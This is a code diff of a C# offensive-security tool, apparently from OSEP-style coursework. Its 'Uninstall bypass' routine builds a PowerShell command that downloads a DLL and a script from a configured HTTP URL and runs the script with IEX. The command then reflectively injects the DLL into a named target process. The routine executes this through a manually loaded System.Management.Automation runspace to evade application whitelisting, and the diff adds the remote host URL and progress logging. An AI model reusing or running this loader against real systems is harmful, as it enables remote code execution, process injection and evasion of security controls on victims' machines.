@@ -13,13 +13,7 @@ namespace OSEP
     {
         static void Main(string[] args)
         {
-            StringBuilder sb = new StringBuilder();
-            sb.Append($"${CONFIG.INVOKEREF_VARNAMEA} = (New-Object System.Net.WebClient).DownloadData('{CONFIG.INVOKEREF_HOSTED_DLL_NAME}');");
-            sb.Append($"New-Object System.Net.WebClient).DownloadString('{CONFIG.INVOKEREF_HOSTED_SCRIPT_NAME}') | IEX;");
-            sb.Append($"${CONFIG.INVOKEREF_VARNAMEB} = (Get-Process -Name {CONFIG.INVOKEREF_TARGET_PROCESS}).Id;");
-            sb.Append($"Invoke-ReflectivePEInjection -PEBytes ${CONFIG.INVOKEREF_VARNAMEA} -ProcId ${CONFIG.INVOKEREF_VARNAMEB};");
-
-            Console.WriteLine(sb.ToString());
+            Console.WriteLine("Try Harder???");
         }
     }
 
@@ -28,20 +22,20 @@ namespace OSEP
     {
         public async override void Uninstall(System.Collections.IDictionary savedState)
         {
-            Debug.RunDebug("\nUninstall bypass started.");
+            Debug.RunDebug("Uninstall bypass started.");
 
 
             StringBuilder sb = new StringBuilder();
-            sb.Append($"${CONFIG.INVOKEREF_VARNAMEA} = (New-Object System.Net.WebClient).DownloadData('{CONFIG.INVOKEREF_HOSTED_DLL_NAME}');");
-            sb.Append($"New-Object System.Net.WebClient).DownloadString('{CONFIG.INVOKEREF_HOSTED_SCRIPT_NAME}') | IEX;");
+            sb.Append($"${CONFIG.INVOKEREF_VARNAMEA} = (New-Object System.Net.WebClient).DownloadData('{CONFIG.HTTP_URL}/{CONFIG.INVOKEREF_HOSTED_DLL_NAME}');");
+            sb.Append($"New-Object System.Net.WebClient).DownloadString('{CONFIG.HTTP_URL}/{CONFIG.INVOKEREF_HOSTED_SCRIPT_NAME}') | IEX;");
             sb.Append($"${CONFIG.INVOKEREF_VARNAMEB} = (Get-Process -Name {CONFIG.INVOKEREF_TARGET_PROCESS}).Id;");
             sb.Append($"Invoke-ReflectivePEInjection -PEBytes ${CONFIG.INVOKEREF_VARNAMEA} -ProcId ${CONFIG.INVOKEREF_VARNAMEB};");
 
             string script = sb.ToString();
 
 
-            Assembly sma;
 
+            Debug.RunDebug("Locating SMA...");
             string windir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
             string[] locations = {
                 Path.Combine(windir, @"System32\WindowsPowerShell\v1.0\System.Management.Automation.dll"),
@@ -52,6 +46,9 @@ namespace OSEP
 
             string dllPath = locations.FirstOrDefault(File.Exists);
 
+
+            Debug.RunDebug("Loading SMA assembly...");
+            Assembly sma;
             if (dllPath != null)
             {
                 sma = Assembly.LoadFrom(dllPath);
@@ -65,22 +62,19 @@ namespace OSEP
                 "PublicKeyToken=31bf3856ad364e35");
             }
 
-            if (sma == null) { Environment.Exit(0); }
+            if (sma == null) {
+                Debug.RunDebug("Cant find SMA. Aborting...");
+                Environment.Exit(0); 
+            }
 
 
+            Debug.RunDebug("Invoking Script...");
             Type runspaceFactoryType = sma.GetType("System.Management.Automation.Runspaces.RunspaceFactory", throwOnError: true);
-
             Type powerShellType = sma.GetType("System.Management.Automation.PowerShell", throwOnError: true);
-
             object runspace = runspaceFactoryType.GetMethod("CreateRunspace", Type.EmptyTypes).Invoke(null, null);
             object powerShell = powerShellType.GetMethod("Create", Type.EmptyTypes).Invoke(null, null);
-
             runspace.GetType().GetMethod("Open", Type.EmptyTypes).Invoke(runspace, null);
-
             powerShellType.GetProperty("Runspace").SetValue(powerShell, runspace, null);
-
-
-
             powerShellType.GetMethod("AddScript", new[] { typeof(string) }).Invoke(powerShell, new object[] { script });
 
             MethodInfo invokeMethod = powerShellType.GetMethods(BindingFlags.Public | BindingFlags.Instance).Single(method =>
@@ -94,6 +88,9 @@ namespace OSEP
 
             (powerShell as IDisposable)?.Dispose();
             (runspace as IDisposable)?.Dispose();
+
+            Debug.RunDebug($"DLL Injected into {CONFIG.INVOKEREF_TARGET_PROCESS}...");
+            Debug.RunDebug("Done...");
         }
 
         public static async Task<byte[]> DownloadFileAsync(string url)
